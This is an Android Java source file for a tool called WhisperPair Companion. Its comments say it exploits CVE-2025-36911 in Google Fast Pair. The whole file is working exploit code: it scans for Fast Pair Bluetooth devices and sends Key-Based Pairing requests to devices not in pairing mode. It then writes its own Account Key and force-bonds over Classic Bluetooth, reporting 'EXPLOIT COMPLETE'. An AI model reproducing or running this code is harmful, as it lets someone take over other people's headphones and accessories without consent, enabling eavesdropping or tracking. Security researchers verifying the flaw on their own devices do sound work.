package com.whisperpair.companion;

import android.Manifest;
import android.app.Activity;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothGatt;
import android.bluetooth.BluetoothGattCallback;
import android.bluetooth.BluetoothGattCharacteristic;
import android.bluetooth.BluetoothGattDescriptor;
import android.bluetooth.BluetoothGattService;
import android.bluetooth.BluetoothManager;
import android.bluetooth.BluetoothProfile;
import android.bluetooth.le.BluetoothLeScanner;
import android.bluetooth.le.ScanCallback;
import android.bluetooth.le.ScanFilter;
import android.bluetooth.le.ScanResult;
import android.bluetooth.le.ScanSettings;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.ParcelUuid;
import android.util.Log;
import android.widget.TextView;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.graphics.Typeface;

import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * WhisperPair Companion - Performs Fast Pair KBP from the Android phone.
 *
 * Exploits CVE-2025-36911: the target device accepts Key-Based Pairing
 * requests even when NOT in pairing mode.
 *
 * Flow:
 *   1. BLE scan → connect
 *   2. KBP write (proves vulnerability)
 *   3. Account Key write
 *   4. Disconnect BLE
 *   5. Classic BT discovery (find BR/EDR address by name)
 *   6. Classic BT bond
 *
 * Launch via ADB:
 *   adb shell am start -a com.whisperpair.PAIR --es address "BLE_ADDR"
 */
public class FastPairActivity extends Activity {

    private static final String TAG = "WhisperPair";

    // Fast Pair GATT UUIDs
    private static final UUID SERVICE_UUID =
            UUID.fromString("0000fe2c-0000-1000-8000-00805f9b34fb");
    private static final UUID CHAR_KEY_PAIRING =
            UUID.fromString("fe2c1234-8366-4814-8eb0-01de32100bea");
    private static final UUID CHAR_PASSKEY =
            UUID.fromString("fe2c1235-8366-4814-8eb0-01de32100bea");
    private static final UUID CHAR_ACCOUNT_KEY =
            UUID.fromString("fe2c1236-8366-4814-8eb0-01de32100bea");
    private static final UUID CCCD =
            UUID.fromString("00002902-0000-1000-8000-00805f9b34fb");

    private BluetoothAdapter btAdapter;
    private BluetoothGatt gatt;
    private String targetAddress;       // Current BLE address (updated after scan)
    private String originalAddress;     // Address from intent
    private byte[] sharedSecret;
    private String brEdrAddress;
    private byte[] accountKey;
    private volatile boolean kbpAccepted = false;
    private volatile boolean accountKeyWritten = false;
    private volatile boolean reportDoneCalled = false;
    private String deviceName;          // Learned during BLE, used for Classic BT match
    private int connectAttempt = 0;

    private BluetoothLeScanner bleScanner;
    private ScanCallback scanCallback;

    private TextView logView;
    private ScrollView scrollView;
    private Handler mainHandler;

    // =========================================================================
    // LIFECYCLE
    // =========================================================================

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        scrollView = new ScrollView(this);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(32, 32, 32, 32);

        logView = new TextView(this);
        logView.setTypeface(Typeface.MONOSPACE);
        logView.setTextSize(12);
        layout.addView(logView);
        scrollView.addView(layout);
        setContentView(scrollView);

        mainHandler = new Handler(Looper.getMainLooper());

        Intent intent = getIntent();
        targetAddress = intent.getStringExtra("address");
        originalAddress = targetAddress;
        String explicitBrEdr = intent.getStringExtra("bredr_address");
        if (explicitBrEdr != null && !explicitBrEdr.isEmpty()
                && !explicitBrEdr.equalsIgnoreCase(targetAddress)) {
            brEdrAddress = explicitBrEdr;
        }

        if (targetAddress == null || targetAddress.isEmpty()) {
            log("ERROR: No address provided");
            return;
        }

        log("WhisperPair Companion - CVE-2025-36911");
        log("Target BLE: " + targetAddress);
        if (brEdrAddress != null) {
            log("Explicit BR/EDR: " + brEdrAddress);
        }
        log("");

        if (checkSelfPermission(Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED
                || checkSelfPermission(Manifest.permission.BLUETOOTH_SCAN) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{
                    Manifest.permission.BLUETOOTH_CONNECT,
                    Manifest.permission.BLUETOOTH_SCAN
            }, 1);
        } else {
            startExploit();
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        // Reset all state so the new intent is processed fresh
        stopBleScan();
        closeGatt();
        try { btAdapter.cancelDiscovery(); } catch (Exception ignored) {}
        try { unregisterReceiver(discoveryReceiver); } catch (Exception ignored) {}
        try { unregisterReceiver(classicBondReceiver); } catch (Exception ignored) {}
        kbpAccepted = false;
        accountKeyWritten = false;
        reportDoneCalled = false;
        discoveryActive = false;
        connectAttempt = 0;
        brEdrAddress = null;
        sharedSecret = null;
        accountKey = null;
        deviceName = null;

        targetAddress = intent.getStringExtra("address");
        originalAddress = targetAddress;
        String explicitBrEdr = intent.getStringExtra("bredr_address");
        if (explicitBrEdr != null && !explicitBrEdr.isEmpty()
                && !explicitBrEdr.equalsIgnoreCase(targetAddress)) {
            brEdrAddress = explicitBrEdr;
        }

        // Clear log and restart
        logView.setText("");
        if (targetAddress == null || targetAddress.isEmpty()) {
            log("ERROR: No address provided in new intent");
            return;
        }
        log("WhisperPair Companion - CVE-2025-36911 (re-launched)");
        log("Target BLE: " + targetAddress);
        if (brEdrAddress != null) {
            log("Explicit BR/EDR: " + brEdrAddress);
        }
        log("");
        startExploit();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        for (int r : grantResults) {
            if (r != PackageManager.PERMISSION_GRANTED) {
                log("ERROR: Bluetooth permissions denied");
                return;
            }
        }
        startExploit();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopBleScan();
        closeGatt();
        try { btAdapter.cancelDiscovery(); } catch (Exception ignored) {}
        try { unregisterReceiver(discoveryReceiver); } catch (Exception ignored) {}
        try { unregisterReceiver(classicBondReceiver); } catch (Exception ignored) {}
    }

    private void startExploit() {
        BluetoothManager btManager = getSystemService(BluetoothManager.class);
        btAdapter = btManager.getAdapter();
        if (btAdapter == null || !btAdapter.isEnabled()) {
            log("ERROR: Bluetooth not available or disabled");
            return;
        }
        startBleScan();
    }

    // =========================================================================
    // PHASE 1: BLE SCAN — find the device at its current advertising address
    // =========================================================================

    private void startBleScan() {
        bleScanner = btAdapter.getBluetoothLeScanner();
        if (bleScanner == null) {
            log("[1/7] BLE scanner unavailable, trying direct connect...");
            connectToDevice(targetAddress);
            return;
        }

        log("[1/7] Scanning for Fast Pair device...");

        List<ScanFilter> filters = new ArrayList<>();
        filters.add(new ScanFilter.Builder()
                .setServiceUuid(new ParcelUuid(SERVICE_UUID))
                .build());
        ScanSettings settings = new ScanSettings.Builder()
                .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
                .build();

        final ScanResult[] bestResult = {null};

        scanCallback = new ScanCallback() {
            @Override
            public void onScanResult(int callbackType, ScanResult result) {
                String addr = result.getDevice().getAddress();
                String name = result.getDevice().getName();
                int rssi = result.getRssi();

                if (addr.equalsIgnoreCase(targetAddress) || addr.equalsIgnoreCase(originalAddress)) {
                    log("[1/7] Found target: " + addr + nameTag(name) + " RSSI=" + rssi);
                    stopBleScan();
                    targetAddress = addr;
                    connectToDevice(addr);
                    return;
                }

                log("[1/7] Found: " + addr + nameTag(name) + " RSSI=" + rssi);
                if (bestResult[0] == null || rssi > bestResult[0].getRssi()) {
                    bestResult[0] = result;
                }
            }

            @Override
            public void onScanFailed(int errorCode) {
                log("[1/7] Scan failed (error=" + errorCode + "), trying direct connect...");
                connectToDevice(targetAddress);
            }
        };

        try {
            bleScanner.startScan(filters, settings, scanCallback);
        } catch (SecurityException e) {
            log("[1/7] Scan permission error, trying direct connect...");
            connectToDevice(targetAddress);
            return;
        }

        mainHandler.postDelayed(() -> {
            stopBleScan();
            if (gatt != null) return;

            if (bestResult[0] != null) {
                String addr = bestResult[0].getDevice().getAddress();
                log("[1/7] Using strongest: " + addr + nameTag(bestResult[0].getDevice().getName()));
                targetAddress = addr;
                connectToDevice(addr);
            } else {
                log("[1/7] No Fast Pair device in scan, trying original address...");
                connectToDevice(originalAddress);
            }
        }, 10000);
    }

    private void stopBleScan() {
        if (bleScanner != null && scanCallback != null) {
            try { bleScanner.stopScan(scanCallback); } catch (Exception ignored) {}
            scanCallback = null;
        }
    }

    // =========================================================================
    // PHASE 2: BLE CONNECT with retry
    // =========================================================================

    private void connectToDevice(String address) {
        connectAttempt++;
        log("[2/7] Connecting to " + address + " (attempt " + connectAttempt + ")...");
        BluetoothDevice device = btAdapter.getRemoteDevice(address);
        gatt = device.connectGatt(this, false, gattCallback, BluetoothDevice.TRANSPORT_LE);
    }

    // =========================================================================
    // PHASE 3-5: GATT operations (discover, KBP, account key)
    // =========================================================================

    private final BluetoothGattCallback gattCallback = new BluetoothGattCallback() {

        @Override
        public void onConnectionStateChange(BluetoothGatt g, int status, int newState) {
            if (newState == BluetoothProfile.STATE_CONNECTED) {
                BluetoothDevice dev = g.getDevice();
                if (dev != null && dev.getName() != null) {
                    deviceName = dev.getName();
                    log("[2/7] Connected! Device: " + deviceName);
                } else {
                    log("[2/7] Connected!");
                }
                g.discoverServices();

            } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                if (!kbpAccepted && connectAttempt < 3) {
                    log("BLE disconnected (status=" + status + "), retrying...");
                    g.close();
                    gatt = null;
                    mainHandler.postDelayed(() -> {
                        if (!kbpAccepted) connectToDevice(targetAddress);
                    }, 2000);
                } else if (!reportDoneCalled) {
                    log("BLE disconnected (status=" + status + ")");
                    // If we already wrote the account key, proceed to Classic BT discovery
                    if (accountKeyWritten) {
                        startClassicDiscovery();
                    }
                }
            }
        }

        @Override
        public void onServicesDiscovered(BluetoothGatt g, int status) {
            if (status != BluetoothGatt.GATT_SUCCESS) {
                log("ERROR: Service discovery failed");
                return;
            }

            BluetoothGattService service = g.getService(SERVICE_UUID);
            if (service == null) {
                log("ERROR: Fast Pair service (0xFE2C) not found");
                return;
            }
            log("[3/7] Fast Pair service found");

            BluetoothGattCharacteristic kbpChar = service.getCharacteristic(CHAR_KEY_PAIRING);
            if (kbpChar != null) {
                g.setCharacteristicNotification(kbpChar, true);
                BluetoothGattDescriptor desc = kbpChar.getDescriptor(CCCD);
                if (desc != null) {
                    desc.setValue(BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE);
                    g.writeDescriptor(desc);
                    log("[3/7] Subscribed to KBP notifications");
                } else {
                    sendKbpRequest(g);
                }
            } else {
                log("ERROR: KBP characteristic not found");
            }
        }

        @Override
        public void onDescriptorWrite(BluetoothGatt g, BluetoothGattDescriptor descriptor, int status) {
            if (status == BluetoothGatt.GATT_SUCCESS) {
                BluetoothGattService service = g.getService(SERVICE_UUID);
                BluetoothGattCharacteristic passkeyChar = service != null ?
                        service.getCharacteristic(CHAR_PASSKEY) : null;

                if (passkeyChar != null
                        && !descriptor.getCharacteristic().getUuid().equals(CHAR_PASSKEY)) {
                    g.setCharacteristicNotification(passkeyChar, true);
                    BluetoothGattDescriptor desc = passkeyChar.getDescriptor(CCCD);
                    if (desc != null) {
                        desc.setValue(BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE);
                        g.writeDescriptor(desc);
                        return;
                    }
                }
                sendKbpRequest(g);
            }
        }

        @Override
        public void onCharacteristicWrite(BluetoothGatt g, BluetoothGattCharacteristic c, int status) {
            if (c.getUuid().equals(CHAR_KEY_PAIRING)) {
                if (status == BluetoothGatt.GATT_SUCCESS) {
                    kbpAccepted = true;
                    log("[4/7] KBP ACCEPTED - Device is VULNERABLE!");
                    log("Waiting for KBP response...");

                    mainHandler.postDelayed(() -> {
                        if (!accountKeyWritten) {
                            log("No KBP response, proceeding...");
                            writeAccountKey(g);
                        }
                    }, 5000);
                } else {
                    log("ERROR: KBP rejected (status=" + status + ")");
                    closeGatt();
                    reportDone(false);
                }

            } else if (c.getUuid().equals(CHAR_ACCOUNT_KEY)) {
                if (status == BluetoothGatt.GATT_SUCCESS) {
                    log("[5/7] Account Key written: " + bytesToHex(accountKey));
                } else {
                    log("WARNING: Account Key write failed (status=" + status + ")");
                }

                // Done with BLE GATT — disconnect and discover BR/EDR via Classic BT
                closeGatt();

                if (brEdrAddress != null) {
                    // Already have BR/EDR address (from KBP response or intent)
                    log("BR/EDR address known: " + brEdrAddress + ", bonding...");
                    bondClassicBt(btAdapter.getRemoteDevice(brEdrAddress));
                } else {
                    // Discover BR/EDR address via Classic BT inquiry
                    startClassicDiscovery();
                }
            }
        }

        @Override
        public void onCharacteristicChanged(BluetoothGatt g, BluetoothGattCharacteristic c) {
            handleNotification(g, c.getUuid(), c.getValue());
        }

        @Override
        public void onCharacteristicChanged(BluetoothGatt g, BluetoothGattCharacteristic c, byte[] value) {
            handleNotification(g, c.getUuid(), value);
        }
    };

    private void handleNotification(BluetoothGatt g, UUID charUuid, byte[] value) {
        if (value == null || value.length == 0) return;
        log("Notification: " + bytesToHex(value) + " (" + value.length + " bytes)");

        if (charUuid.equals(CHAR_KEY_PAIRING) && value.length >= 16) {
            String addr = parseKbpResponse(value);
            if (addr != null && brEdrAddress == null) {
                brEdrAddress = addr;
                log("BR/EDR from KBP response: " + brEdrAddress);
            }
            if (!accountKeyWritten) {
                writeAccountKey(g);
            }
        }
    }

    private void sendKbpRequest(BluetoothGatt g) {
        log("[4/7] Sending KBP request (CVE-2025-36911)...");

        BluetoothGattService service = g.getService(SERVICE_UUID);
        BluetoothGattCharacteristic kbpChar = service.getCharacteristic(CHAR_KEY_PAIRING);

        byte[] request = new byte[16];
        request[0] = 0x00; // Key-Based Pairing Request
        request[1] = 0x01; // Flags: initiate bonding

        String[] parts = targetAddress.split(":");
        for (int i = 0; i < 6 && i < parts.length; i++) {
            request[2 + i] = (byte) Integer.parseInt(parts[i], 16);
        }

        SecureRandom rng = new SecureRandom();
        byte[] salt = new byte[8];
        rng.nextBytes(salt);
        System.arraycopy(salt, 0, request, 8, 8);

        sharedSecret = new byte[16];
        System.arraycopy(salt, 0, sharedSecret, 0, 8);

        log("  Request: " + bytesToHex(request));
        kbpChar.setValue(request);
        kbpChar.setWriteType(BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT);
        g.writeCharacteristic(kbpChar);
    }

    private void writeAccountKey(BluetoothGatt g) {
        if (accountKeyWritten) return;
        accountKeyWritten = true;

        log("[5/7] Writing Account Key...");

        BluetoothGattService service = g.getService(SERVICE_UUID);
        if (service == null) {
            log("WARNING: Service lost");
            closeGatt();
            startClassicDiscovery();
            return;
        }
        BluetoothGattCharacteristic akChar = service.getCharacteristic(CHAR_ACCOUNT_KEY);
        if (akChar == null) {
            log("WARNING: Account Key characteristic not found");
            closeGatt();
            startClassicDiscovery();
            return;
        }

        accountKey = new byte[16];
        accountKey[0] = 0x04;
        new SecureRandom().nextBytes(accountKey);
        accountKey[0] = 0x04; // Restore type byte after random fill

        byte[] dataToWrite;
        if (sharedSecret != null) {
            dataToWrite = aesEncrypt(sharedSecret, accountKey);
            if (dataToWrite == null) dataToWrite = accountKey;
        } else {
            dataToWrite = accountKey;
        }

        akChar.setValue(dataToWrite);
        akChar.setWriteType(BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT);
        g.writeCharacteristic(akChar);
    }

    // =========================================================================
    // PHASE 6: CLASSIC BT DISCOVERY — find BR/EDR address by device name
    // =========================================================================

    private volatile boolean discoveryActive = false;

    private void startClassicDiscovery() {
        if (discoveryActive || reportDoneCalled) return;
        discoveryActive = true;

        // Build search name by stripping BLE-specific suffixes
        String searchName = null;
        if (deviceName != null) {
            searchName = deviceName
                    .replace("-LE", "").replace("-GFP", "")
                    .replace("LE_", "").replace(" LE", "")
                    .trim();
        }

        if (searchName == null || searchName.isEmpty()) {
            log("[6/7] No device name available for Classic BT discovery");
            reportDone(kbpAccepted);
            return;
        }

        log("[6/7] Classic BT discovery for '" + searchName + "'...");
        classicSearchName = searchName;

        IntentFilter filter = new IntentFilter();
        filter.addAction(BluetoothDevice.ACTION_FOUND);
        filter.addAction(BluetoothAdapter.ACTION_DISCOVERY_FINISHED);
        registerReceiver(discoveryReceiver, filter);

        boolean started;
        try {
            started = btAdapter.startDiscovery();
        } catch (SecurityException e) {
            log("ERROR: Discovery permission denied");
            try { unregisterReceiver(discoveryReceiver); } catch (Exception ignored) {}
            reportDone(kbpAccepted);
            return;
        }

        if (!started) {
            log("WARNING: startDiscovery() returned false");
            try { unregisterReceiver(discoveryReceiver); } catch (Exception ignored) {}
            reportDone(kbpAccepted);
            return;
        }

        // Safety timeout — Classic BT inquiry typically finishes in ~12s
        mainHandler.postDelayed(() -> {
            if (!reportDoneCalled && discoveryActive) {
                log("Classic BT discovery timeout");
                try { btAdapter.cancelDiscovery(); } catch (Exception ignored) {}
                try { unregisterReceiver(discoveryReceiver); } catch (Exception ignored) {}
                discoveryActive = false;
                reportDone(kbpAccepted);
            }
        }, 20000);
    }

    private String classicSearchName;

    private final BroadcastReceiver discoveryReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (action == null) return;

            if (BluetoothDevice.ACTION_FOUND.equals(action)) {
                BluetoothDevice device = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
                if (device == null) return;

                String name = device.getName();
                String addr = device.getAddress();

                if (name == null) return;
                log("  Discovered: " + addr + " (" + name + ")");

                // Match by name (case-insensitive substring)
                if (classicSearchName != null
                        && name.toLowerCase().contains(classicSearchName.toLowerCase())) {
                    log("[6/7] Found BR/EDR: " + addr + " (" + name + ")");
                    brEdrAddress = addr;
                    discoveryActive = false;

                    try { btAdapter.cancelDiscovery(); } catch (Exception ignored) {}
                    try { unregisterReceiver(this); } catch (Exception ignored) {}

                    bondClassicBt(device);
                }

            } else if (BluetoothAdapter.ACTION_DISCOVERY_FINISHED.equals(action)) {
                discoveryActive = false;
                if (brEdrAddress == null) {
                    log("[6/7] Classic BT discovery finished — device not found");
                    try { unregisterReceiver(this); } catch (Exception ignored) {}
                    reportDone(kbpAccepted);
                }
            }
        }
    };

    // =========================================================================
    // PHASE 7: CLASSIC BT BONDING
    // =========================================================================

    private void bondClassicBt(BluetoothDevice device) {
        log("[7/7] Classic BT bonding with " + device.getAddress() + "...");

        IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_BOND_STATE_CHANGED);
        registerReceiver(classicBondReceiver, filter);

        boolean started;
        try {
            // Use reflection to specify TRANSPORT_BREDR (= 1)
            java.lang.reflect.Method m = BluetoothDevice.class.getMethod("createBond", int.class);
            started = (boolean) m.invoke(device, 1);
            log("  createBond(BREDR) returned: " + started);
        } catch (Exception e) {
            started = device.createBond();
            log("  createBond() returned: " + started);
        }

        if (!started) {
            // Check if already bonded
            if (device.getBondState() == BluetoothDevice.BOND_BONDED) {
                log("  Already bonded!");
                brEdrAddress = device.getAddress();
                try { unregisterReceiver(classicBondReceiver); } catch (Exception ignored) {}
                reportDone(true);
                return;
            }
            log("WARNING: createBond returned false");
        }

        // Timeout for Classic BT bonding
        mainHandler.postDelayed(() -> {
            if (!reportDoneCalled) {
                log("Classic BT bond timeout");
                try { unregisterReceiver(classicBondReceiver); } catch (Exception ignored) {}
                reportDone(kbpAccepted);
            }
        }, 25000);
    }

    private final BroadcastReceiver classicBondReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (!BluetoothDevice.ACTION_BOND_STATE_CHANGED.equals(intent.getAction())) return;

            int state = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, -1);
            BluetoothDevice device = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);

            switch (state) {
                case BluetoothDevice.BOND_BONDING:
                    log("  Classic BT bonding in progress...");
                    break;

                case BluetoothDevice.BOND_BONDED:
                    String addr = device != null ? device.getAddress() : brEdrAddress;
                    int type = device != null ? device.getType() : -1;
                    String typeStr = type == 1 ? "Classic" : type == 3 ? "Dual" : "type=" + type;
                    log("  Classic BT bonded: " + addr + " (" + typeStr + ")");
                    brEdrAddress = addr;
                    try { unregisterReceiver(this); } catch (Exception ignored) {}
                    reportDone(true);
                    break;

                case BluetoothDevice.BOND_NONE:
                    log("  Classic BT bond failed");
                    try { unregisterReceiver(this); } catch (Exception ignored) {}
                    reportDone(kbpAccepted);
                    break;
            }
        }
    };

    // =========================================================================
    // RESULTS
    // =========================================================================

    private void reportDone(boolean success) {
        if (reportDoneCalled) return;
        reportDoneCalled = true;

        log("");
        if (success && kbpAccepted) {
            log("=== EXPLOIT COMPLETE ===");
            log("KBP accepted (CVE-2025-36911 confirmed).");
            if (accountKey != null) {
                log("Account Key written: " + bytesToHex(accountKey));
            }
            if (brEdrAddress != null) {
                log("BR/EDR address: " + brEdrAddress);
                log("Classic BT paired: YES");
            } else {
                log("BR/EDR address: not resolved");
            }
        } else if (kbpAccepted) {
            log("=== PARTIAL SUCCESS ===");
            log("KBP accepted (device IS vulnerable) but pairing did not complete.");
        } else {
            log("=== FAILED ===");
            log("Could not connect or KBP was rejected.");
        }

        log("RESOLVED_BREDR_ADDRESS=" + (brEdrAddress != null ? brEdrAddress : "UNKNOWN"));

        Intent result = new Intent("com.whisperpair.RESULT");
        result.putExtra("success", success);
        result.putExtra("kbp_accepted", kbpAccepted);
        result.putExtra("br_edr_address", brEdrAddress);
        if (accountKey != null) {
            result.putExtra("account_key", bytesToHex(accountKey));
        }
        sendBroadcast(result);
    }

    // =========================================================================
    // HELPERS
    // =========================================================================

    private void closeGatt() {
        if (gatt != null) {
            try { gatt.disconnect(); } catch (Exception ignored) {}
            try { gatt.close(); } catch (Exception ignored) {}
            gatt = null;
        }
    }

    private static String nameTag(String name) {
        return name != null ? " (" + name + ")" : "";
    }

    private String parseKbpResponse(byte[] data) {
        if (data == null || data.length < 16) return null;

        if (sharedSecret != null) {
            byte[] dec = aesDecrypt(sharedSecret, data);
            if (dec != null && dec[0] == 0x01 && dec.length >= 7) {
                String mac = formatMac(dec, 1);
                if (isValidMac(mac)) return mac;
            }
        }

        if (data[0] == 0x01 && data.length >= 7) {
            String mac = formatMac(data, 1);
            if (isValidMac(mac)) return mac;
        }
        return null;
    }

    private static boolean isValidMac(String mac) {
        return mac != null && !mac.equals("00:00:00:00:00:00") && !mac.equals("FF:FF:FF:FF:FF:FF");
    }

    private static String formatMac(byte[] data, int offset) {
        if (offset + 6 > data.length) return null;
        return String.format("%02X:%02X:%02X:%02X:%02X:%02X",
                data[offset] & 0xFF, data[offset + 1] & 0xFF, data[offset + 2] & 0xFF,
                data[offset + 3] & 0xFF, data[offset + 4] & 0xFF, data[offset + 5] & 0xFF);
    }

    private static byte[] aesEncrypt(byte[] key, byte[] data) {
        try {
            byte[] k = new byte[16];
            System.arraycopy(key, 0, k, 0, Math.min(key.length, 16));
            Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, "AES"));
            return cipher.doFinal(data);
        } catch (Exception e) { return null; }
    }

    private static byte[] aesDecrypt(byte[] key, byte[] data) {
        try {
            byte[] k = new byte[16];
            System.arraycopy(key, 0, k, 0, Math.min(key.length, 16));
            Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(k, "AES"));
            return cipher.doFinal(data, 0, 16);
        } catch (Exception e) { return null; }
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02x", b));
        return sb.toString();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        mainHandler.post(() -> {
            logView.append(msg + "\n");
            scrollView.post(() -> scrollView.fullScroll(ScrollView.FOCUS_DOWN));
        });
    }
}
